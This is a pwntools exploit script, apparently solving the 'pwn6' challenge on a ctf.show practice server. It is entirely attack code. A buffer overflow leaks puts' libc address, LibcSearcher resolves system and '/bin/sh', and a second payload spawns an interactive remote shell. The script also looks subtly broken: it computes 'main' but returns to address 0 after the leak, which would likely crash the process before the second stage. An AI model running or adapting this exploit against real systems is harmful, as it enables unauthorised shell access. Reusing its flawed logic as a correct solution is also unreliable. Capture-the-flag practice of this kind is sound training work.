from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
io = remote('pwn.challenge.ctf.show',28178)
elf =ELF('pwn6')

main = elf.symbols['main']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
payload = cyclic(0x9C+4)+p32(puts_plt)+p32(0)+p32(puts_got)+p32(4)
io.recvuntil('Start your show time:')
io.sendline(payload)
puts= u32(io.recvuntil(b'\xf7')[-4:])
print(hex(puts))
libc =LibcSearcher('puts',puts)
libc_base = puts - libc.dump('puts')    
binsh = libc_base + libc.dump('str_bin_sh')
system = libc_base + libc.dump('system')
payload = cyclic(0x9C+4)+p32(system)+p32(0)+p32(binsh)
io.sendline(payload)
io.recv()
io.interactive()